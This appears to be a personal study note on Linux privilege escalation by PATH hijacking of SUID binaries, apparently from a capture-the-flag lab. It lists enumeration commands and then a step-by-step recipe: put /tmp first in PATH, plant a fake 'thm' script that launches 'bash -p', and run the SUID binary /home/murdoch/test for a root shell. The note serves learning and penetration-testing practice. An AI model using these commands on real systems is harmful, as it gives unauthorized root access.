---
title: PATH Hijacking for SUID
category: linux-privilege-escalation
tags: [ks-import, path-hijacking, suid, privilege-escalation, linux, environment-variables]
source: linux prev/attack6.md
sourceId: 10024
---
📂 STREAMLINED OBSIDIAN VAULT ENTRY

> ```
> Title: Linux PrivEsc - PATH Hijacking (SUID Context)
> ```
> **==Tags: #Linux #PrivEsc #PATH #SUID #EnvironmentVariables==**

>         ==**Inspect User's PATH:**==
```
echo $PATH
```

> ```
>         ==**Find Writable Directories:**== 
> ```
```
find / -writable -type d 2>/dev/null
```

> ```
>         Find SUID Binaries: 
> ```
```
find / -perm -u=s -type f 2>/dev/null
```

>     **==**Exploitation Pattern:**==**
> ```
> 
>         Identify unquoted binary call inside SUID program (via strings [binary]).
> 
>         Prepend writable directory to PATH: ==export PATH=/tmp:$PATH== (or use existing writable PATH directory).
> 
>         Create malicious payload with target name in that folder: 
```
>         echo '/bin/bash -p' > /tmp/[target_cmd] && chmod +x /tmp/[target_cmd]
```

```
# 1. Add a writable folder to the beginning of your PATH
export PATH=/tmp:$PATH

# 2. Create a fake "thm" that gives a root shell
echo '#!/bin/bash
/bin/bash -p' > /tmp/thm

# 3. Make it executable
chmod +x /tmp/thm

# 4. Run the SUID binary
/home/murdoch/test
```
